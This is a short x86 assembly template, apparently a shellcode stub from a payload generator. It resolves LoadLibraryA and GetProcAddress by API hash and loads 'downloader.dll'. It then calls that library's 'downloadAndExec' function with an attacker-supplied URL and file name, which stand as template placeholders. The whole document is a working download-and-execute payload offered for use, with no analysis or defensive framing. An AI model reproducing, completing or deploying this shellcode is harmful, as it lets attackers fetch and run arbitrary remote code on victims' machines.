[bits 32]
[section .text]

    push 0x5A3A18A5         ;LoadLibraryA
    call hash_search_IAT
    pop eax
    push 0x00006c6c
    push 0x642e7265
    push 0x64616f6c
    push 0x6e776f64
    push esp
    call eax
                            ; pop "downloader.dll"
    pop ebx
    pop ebx
    pop ebx
    pop ebx
    push eax
    push 0xEA39C6C1         ; GetProcAddress
    call hash_search_IAT
    pop eax
    pop ebx                 ; hModule
    push 0x00636578         ; downloadAndExec
    push 0x45646e41
    push 0x64616f6c
    push 0x6e776f64
    push esp
    push ebx
    call eax                ; call GetProcAddress
    pop ebx
    pop ebx
    pop ebx
    pop ebx

                            ; FileName
    {filename}
    push esp
    pop ebx

    ; URL
    {url}
    push esp
    pop ecx
    push ebx
    push ecx
    call eax                ; downloadAndExec

                            ; fix up stack
    {pop_url}
    {pop_filename}
    pop ebx
    pop ebx
    ret